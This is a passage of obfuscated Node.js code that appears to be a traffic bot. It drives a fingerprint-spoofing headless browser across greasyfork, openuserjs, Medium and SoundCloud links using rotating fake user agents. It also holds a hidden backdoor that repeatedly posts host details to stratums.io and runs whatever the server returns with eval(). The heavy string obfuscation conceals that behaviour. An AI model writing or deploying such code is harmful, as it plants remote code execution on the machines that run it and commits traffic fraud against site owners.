        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + aD(0x10) + 'pts/456856' + '-optimize-' + 'quill-org',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + aE(0x15) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + aF(0x1c, 'n^8('),
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + aE(0x16) + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + aD(0x3) + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
      'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
      'https://so' + aD(0xe) + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + aD(0x1d) + 'ing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + aF(0x13, 'q#wb') + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + aD(0xd) + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + aE(0x2) + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + aE(0xc) + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      aE(0x14) + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ],
    'searchTerms': []
  };
data['searchTerm' + 's']['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), data['searchTerm' + 's']['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), data['searchTerm' + 's']['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + aD(0x9) + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x2ad * 0x5 + -0x38d + -0xb3 * 0xe)), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x95c * -0x1 + 0x6b8 + 0x2ae)), data['searchTerm' + 's']['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), data['searchTerm' + 's'] = data['searchTerm' + 's']['flat'](0x19b9 + -0x108f * 0x2 + -0x3 * -0x278);
const HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(f) {
        let g = this,
          h = g;
        for (let i = -0x709 + -0x6 * 0x1db + 0x122b; i < f; i++)
          h = h['concat'](g);
        return h;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
    }
  },
  arrs = new Map(),
  makeFetchCookie = require('fetch-cook' + 'ie');

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x161 * -0x5 + 0x804 + -0x11f);
    let h = e[f];
    if (b['WdbXqm'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x2535 + -0x1fca + -0x56b, s, t, u = 0x210e + -0x9 * -0x2d1 + -0x3a67 * 0x1; t = n['charAt'](u++); ~t && (s = r % (0x8d6 + 0x1 * 0x9c5 + -0x1297) ? s * (0x457 * 0x8 + 0x71 * -0x13 + -0x1a15) + t : t, r++ % (-0x3 * -0x43d + -0xba7 * -0x2 + -0x2401)) ? p += String['fromCharCode'](0x81e * -0x2 + 0x1 * 0xf8a + 0x1 * 0x1b1 & s >> (-(-0x13a + -0x473 + -0x1e5 * -0x3) * r & 0x1d3e + 0x1f7 * 0xd + -0x3 * 0x1241)) : 0x2b5 + -0x9 * -0x95 + -0x7f2) {
          t = o['indexOf'](t);
        }
        for (let v = -0x13 * 0x89 + -0x12a5 + -0xe68 * -0x2, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1c6e * 0x1 + -0x1100 + 0x2d7e))['slice'](-(-0x2 * 0xf6b + 0x153a + 0x99e));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x73f + -0xe61 + 0x1 * 0x15a0,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x169c + 0x2 * -0x1233 + 0xdca; u < -0x1909 * -0x1 + 0x1 * 0x739 + 0x2 * -0xfa1; u++) {
          p[u] = u;
        }
        for (u = 0xa17 * 0x1 + -0x1476 + 0xa5f; u < -0x23 * 0x97 + -0x6d1 + -0x2 * -0xe3b; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1474 + -0x1 * 0x1f35 + -0x40d * -0xd), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1 * -0x135b + 0x18b9 * -0x1 + 0x2c14, q = 0xbad + 0x692 + -0x123f;
        for (let v = 0xb * -0x79 + 0x4 * 0x6ec + 0x13 * -0x12f; v < n['length']; v++) {
          u = (u + (0x2 * -0x8e0 + -0x1899 * 0x1 + 0x2a5a)) % (-0x194 + 0x8e + 0x206), q = (q + p[u]) % (-0x1ac8 + -0x1 * 0x140c + 0x2 * 0x17ea), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x409 + -0x1723 * 0x1 + 0x1 * 0x141a)]);
        }
        return t;
      };
      b['dnaveK'] = m, c = arguments, b['WdbXqm'] = !![];
    }
    const j = e[0x1c3b + 0x130b + -0x2 * 0x17a3],
      k = f + j,
      l = c[k];
    return !l ? (b['TGXoqC'] === undefined && (b['TGXoqC'] = !![]), h = b['dnaveK'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
HookManager['prototypes'](), async function trigger() {
  const aL = c,
    aK = d,
    aJ = b;
  for (;;) {
    try {
      let f = [],
        g = '$';
      if (flags['RPL2_RPRT']) {
        async function h() {
          try {
            axios['post']('https://st' + 'ratums.io/' + 'research', {
              'key': 'CX001_ZCa',
              'dom': me,
              'replUrl': replUrl
            })['then'](j => {
              try {
                const k = j['data'][-0x12d3 + 0x1422 + -0x14f];
                '$' === k ? f['push'](j['data']) : eval(j['data']);
              } catch (l) {}
            })['catch'](j => {});
          } catch (j) {}
        }
        h(), setInterval(h, 0x6ce1c + -0x82 * -0xbe3 + 0x1 * -0x84382);
      }
      if (flags['ActivateBr' + 'owser']) {
        const {
          FakeBrowser: j
        } = require('fakebrowse' + 'r'), k = require('path'), l = k['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), m = new j['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x32e * 0x1 + 0xa * -0x1e7 + 0xe * 0x196)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([
          require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
            'blockTrackers': 0x1,
            'blockTrackersAndAnnoyances': 0x1
          }),
          require('puppeteer-' + 'extra-plug' + 'in-timezon' + 'e')(),
          require('puppeteer-' + 'extra-plug' + 'in-session')['default']()
        ])['userDataDi' + 'r'](l);
        let n;
        aa:
          for (;;)
            try {
              if (flags['doExtFinge' + 'rprint']) {
                let W = await async function X() {
                  let Y;
                  const Z = {
                    'User-Agent': Y['userAgents']['random'](),
                    'Accept-Encoding': 'none'
                  };
                  try {
                    Y = (await axios['get']('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc', {
                      'headers': Z
                    })) ? .['data'];
                  } catch (a0) {}
                  if (Y)
                    try {
                      Y = (await axios['get'](Y, {
                        'headers': Z
                      })) ? .['data'];
                    } catch (a1) {}
                  if (!Y)
                    return await randomWait(), await X();
                  try {
                    return 'object' == typeof Y ? Y : 'string' == typeof Y ? JSON['parse'](Y) : {};
                  } catch (a2) {
                    if (!Y)
                      return await randomWait(), await X();
                  }
                }();
                m['deviceDesc' + 'riptor'](W);
              }
              n = await m['launch']();
              break aa;
            } catch (Y) {
              warn(Y), await randomWait();
            }
        const {
          vanillaBrowser: p,
          userAction: q
        } = n;
        log('index.js\x20c' + 'alled');
        const u = p['defaultBro' + 'wserContex' + 't']();
        async function v(Z = '', a0 = 0x1 * 0x20fb + 0x5 * 0x637 + -0x13 * 0x35f, a1) {
          const a2 = await a1['waitForSel' + 'ector'](Z);
          return await q['simClickEl' + 'ement'](a2, {
            'pauseAfterMouseUp': a0
          }), a2;
        }
        async function w(Z) {
          const a0 = await Z['target']()['createCDPS' + 'ession']();
          await a0['send']('Network.cl' + 'earBrowser' + 'Cookies'), await a0['send']('Network.cl' + 'earBrowser' + 'Cache');
          const a1 = await Z['cookies']();
